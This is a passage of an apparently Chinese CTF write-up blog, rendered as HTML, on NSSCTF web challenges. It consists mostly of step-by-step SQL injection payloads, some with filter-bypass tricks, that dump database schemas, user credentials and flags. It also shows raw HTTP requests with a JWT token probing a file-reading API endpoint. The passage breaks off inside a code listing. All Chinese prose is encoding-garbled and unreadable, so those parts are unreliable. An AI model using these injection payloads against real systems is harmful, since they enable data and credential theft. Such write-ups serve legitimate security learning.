alt="e12f0d6df8aa9cf805081a86bde10b4b.png" /><p>æŸ¥è¯¢è¡¨å</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="28bc8935b945fdd395b45c46fb511689.png" alt="28bc8935b945fdd395b45c46fb511689.png" /><p>æŸ¥è¯¢è¡¨å†…å­—æ®µå</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;NSS_tb&#x27;/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="fda0853ed31d9dc989a0db1275038c06.png" alt="fda0853ed31d9dc989a0db1275038c06.png" /><p>æŸ¥è¯¢å­—æ®µå†…å®¹</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/ununionion/**/select/**/1,database(),group_concat(id,Secr3t,flll444g)/**/from/**/NSS_tb/**/limit/**/1,1#</span><br></pre></td></tr></table></figure><img src="5c1ff72d0d1a5408606592c551d1a663.png" alt="5c1ff72d0d1a5408606592c551d1a663.png" /><h2 id="27-è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL-ï¼æ³¨ä¸€ä¸‹-ï¼"><a href="#27-è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL-ï¼æ³¨ä¸€ä¸‹-ï¼" class="headerlink" title="27.è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL ï¼æ³¨ä¸€ä¸‹ ï¼"></a>27.è¿™æ˜¯ä»€ä¹ˆï¼ŸSQL ï¼æ³¨ä¸€ä¸‹ ï¼</h2><img src="ea14253c98c1786d496d367c75cd16f4.png" alt="ea14253c98c1786d496d367c75cd16f4.png" /><p>å¯ä»¥çœ‹è¦‹sqlä»£ç¢¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT username,password FROM users WHERE id = &quot;</span>.<span class="string">&#x27;((((((&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&#x27;))))))&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>è¼¸å…¥ä¸€å€‹1å¯ä»¥çœ‹åˆ° </p><img src="99609d6114112c4c69c7f32084313877.png" alt="99609d6114112c4c69c7f32084313877.png" /><p>æ¨æ–­æ˜¯ä¸¤ä¸ªå­—æ®µ :</p><p>username &#x3D; tanji       password &#x3D; OHHHHHHH</p><p>select ä¸€ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="2b713b584e3eb2d5439ed2511444aa0e.png" alt="2b713b584e3eb2d5439ed2511444aa0e.png" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="1bbda58f59d944576882ba282830fa45.png" alt="1bbda58f59d944576882ba282830fa45.png" /><p>æ‰€æœ‰æ•°æ®åº“åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(schema_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">-- </span></span><br></pre></td></tr></table></figure><img src="a8b299b36cfae6217bddbd68cc1dc711.png" alt="a8b299b36cfae6217bddbd68cc1dc711.png" /><p>ctfçš„è¡¨åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure><img src="3abceb620f2d24e7d68dc4cca18c16f6.png" alt="3abceb620f2d24e7d68dc4cca18c16f6.png" /><p>æŸ¥usersè¡¨ä¸­çš„å­—æ®µå:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> #</span><br></pre></td></tr></table></figure><img src="d6512debb874046d84a88bfcce76a388.png" alt="d6512debb874046d84a88bfcce76a388.png" /><p>æŸ¥usersè¡¨ä¸­æ•°æ®ï¼š</p><p>0x7e &#x3D; ~ (æ³¢æµªè™Ÿ)åå…­é€²åˆ¶ç·¨ç¢¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(id,<span class="number">0x7e</span>,username,<span class="number">0x7e</span>,password),<span class="number">2</span> <span class="keyword">from</span> users # </span><br></pre></td></tr></table></figure><img src="3b85731201687b978cf3059081b2057d.png" alt="3b85731201687b978cf3059081b2057d.png" /><p>å†çœ‹å…¶ä»–æ•°æ®åº“ï¼Œè¿˜æœ‰ä¸€ä¸ªctftrainingæ•°æ®åº“:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span> #</span><br></pre></td></tr></table></figure><img src="e7f4930394bb7c639d7fd61d9c7c7218.png" alt="e7f4930394bb7c639d7fd61d9c7c7218.png" /><p>å…ˆæŸ¥flagè¡¨çš„å­—æ®µï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>#</span><br></pre></td></tr></table></figure><img src="88becf32643c762cdb4ad11246d44287.png" alt="88becf32643c762cdb4ad11246d44287.png" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> flag,<span class="number">2</span> <span class="keyword">from</span> ctftraining.flag #</span><br></pre></td></tr></table></figure><img src="28257c2a109f722a3b1374fb21ed961a.png" alt="28257c2a109f722a3b1374fb21ed961a.png" /><h2 id="28-ç†æƒ³å›½"><a href="#28-ç†æƒ³å›½" class="headerlink" title="28.ç†æƒ³å›½"></a>28.ç†æƒ³å›½</h2><p>çµ¦äº†ä¸€å€‹jsonæª”:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;swagger&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;info&quot;: &#123;</span><br><span class="line">      &quot;description&quot;: &quot;Interface API Documentation&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;1.1&quot;,</span><br><span class="line">      &quot;title&quot;: &quot;Interface API&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;paths&quot;: &#123;</span><br><span class="line">      &quot;/api-base/v0/register&quot;: &#123;</span><br><span class="line">        &quot;post&quot;: &#123;</span><br><span class="line">          &quot;consumes&quot;: [</span><br><span class="line">            &quot;application/json&quot;</span><br><span class="line">          ],</span><br><span class="line">          &quot;summary&quot;: &quot;User Registration API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user registration&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;username&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserRegistration&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;password&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserRegistration&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Your wisdom is not sufficient to be called a sage&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/login&quot;: &#123;</span><br><span class="line">        &quot;post&quot;: &#123;</span><br><span class="line">          &quot;consumes&quot;: [</span><br><span class="line">            &quot;application/json&quot;</span><br><span class="line">          ],</span><br><span class="line">          &quot;summary&quot;: &quot;User Login API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user login&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;username&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserLogin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;password&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserLogin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/search&quot;: &#123;</span><br><span class="line">        &quot;get&quot;: &#123;</span><br><span class="line">          &quot;summary&quot;: &quot;Information Query API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used to query information&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;name&quot;: &quot;file&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;query&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;type&quot;: &quot;string&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Unauthorized&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;404&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;File not found&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;security&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;TokenAuth&quot;: []</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/logout&quot;: &#123;</span><br><span class="line">        &quot;get&quot;: &#123;</span><br><span class="line">          &quot;summary&quot;: &quot;Logout API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user logout&quot;,</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Unauthorized&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;security&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;TokenAuth&quot;: []</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;definitions&quot;: &#123;</span><br><span class="line">      &quot;UserRegistration&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">          &quot;username&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;password&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;UserLogin&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">          &quot;username&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;password&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;securityDefinitions&quot;: &#123;</span><br><span class="line">      &quot;TokenAuth&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;apiKey&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;Authorization&quot;,</span><br><span class="line">        &quot;in&quot;: &quot;header&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;security&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;TokenAuth&quot;: []</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä¸æœƒçœ‹, æ‹‹çµ¦Dè€å¸«åˆ†æäº†ä¸€ä¸‹:</p><h3 id="ä¸»è¦çµ„æˆéƒ¨åˆ†"><a href="#ä¸»è¦çµ„æˆéƒ¨åˆ†" class="headerlink" title="ä¸»è¦çµ„æˆéƒ¨åˆ†"></a>ä¸»è¦çµ„æˆéƒ¨åˆ†</h3><h3 id="åŸºç¤è³‡è¨Š"><a href="#åŸºç¤è³‡è¨Š" class="headerlink" title="åŸºç¤è³‡è¨Š"></a>åŸºç¤è³‡è¨Š</h3><p>API ç‰ˆæœ¬ï¼šSwagger 2.0</p><p>æ¨™é¡Œï¼šInterface API</p><p>ç‰ˆæœ¬ï¼š1.1</p><p>æè¿°ï¼šä»‹é¢ API æ–‡æª”</p><ol start="2"><li>API ç«¯é»åˆ†æ<br>ğŸ” èªè­‰ç›¸é—œç«¯é»<br>POST &#x2F;api-base&#x2F;v0&#x2F;register - ç”¨æˆ¶è¨»å†Š</li></ol><p>éœ€è¦ username å’Œ password</p><p>éŸ¿æ‡‰ï¼š200æˆåŠŸ, 400åƒæ•¸éŒ¯èª¤, 401æ¬Šé™ä¸è¶³</p><p>POST &#x2F;api-base&#x2F;v0&#x2F;login - ç”¨æˆ¶ç™»å…¥</p><p>éœ€è¦ username å’Œ password</p><p>éŸ¿æ‡‰ï¼š200æˆåŠŸ, 400åƒæ•¸éŒ¯èª¤</p><p>ğŸ” è³‡æ–™æŸ¥è©¢ç«¯é»<br>GET &#x2F;api-base&#x2F;v0&#x2F;search - è³‡è¨ŠæŸ¥è©¢</p><p>éœ€è¦ file æŸ¥è©¢åƒæ•¸</p><p>éœ€è¦ Token èªè­‰</p><p>éŸ¿æ‡‰ï¼š200æˆåŠŸ, 400åƒæ•¸éŒ¯èª¤, 401æœªæˆæ¬Š, 404æª”æ¡ˆä¸å­˜åœ¨</p><p>ğŸšª ç™»å‡ºç«¯é»<br>GET &#x2F;api-base&#x2F;v0&#x2F;logout - ç”¨æˆ¶ç™»å‡º</p><p>éœ€è¦ Token èªè­‰</p><p>éŸ¿æ‡‰ï¼š200æˆåŠŸ, 401æœªæˆæ¬Š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;UserRegistration&quot;: &#123; &quot;username&quot;, &quot;password&quot; &#125;,</span><br><span class="line">  &quot;UserLogin&quot;: &#123; &quot;username&quot;, &quot;password&quot; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨BPæ³¨å†Œä¸€ä¸ªè´¦æˆ·å…ˆ:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api-base/v0/register HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:21401</span><br><span class="line">Content-Type:application/json</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">If-None-Match: &quot;1708337513.0-4226-1006306968&quot;</span><br><span class="line">If-Modified-Since: Mon, 19 Feb 2024 10:11:53 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;a&quot;,&quot;password&quot;:&quot;a&quot;&#125;</span><br></pre></td></tr></table></figure><img src="ddb0bc5ed20228a85676ba21ed691acd.png" alt="ddb0bc5ed20228a85676ba21ed691acd.png" /><p>login ä¸€ä¸‹</p><img src="ceb050b212f68f02ec7f1146781f49e8.png" alt="ceb050b212f68f02ec7f1146781f49e8.png" /><p>ç”¨ä»¥ä¸‹çš„cookie:<br>æ‹‹å»jwt.io:</p><img src="9bb2273710f6ca2f594de0e6ea7f537b.png" alt="9bb2273710f6ca2f594de0e6ea7f537b.png" /><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api-base/v0/search   HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:21401</span><br><span class="line">Content-Type:application/json</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJwYXNzd29yZCI6ImEifQ.BN9dROQHEp6L0iPx03SgsNO2c3rGac428_lCXh4E2ig</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">If-None-Match: &quot;1708337513.0-4226-1006306968&quot;</span><br><span class="line">If-Modified-Since: Mon, 19 Feb 2024 10:11:53 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure><img src="352dfcac48a77da66e3bb9065d9a1305.png" alt="352dfcac48a77da66e3bb9065d9a1305.png" /><p>ç›²çŒœä¸€ä¸‹é€™æ˜¯flaskå¯«çš„ , file &#x3D; app.py </p><img src="ea6506e3ad4c28e8926ab4ccfca1a780.png" alt="ea6506e3ad4c28e8926ab4ccfca1a780.png" /><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span 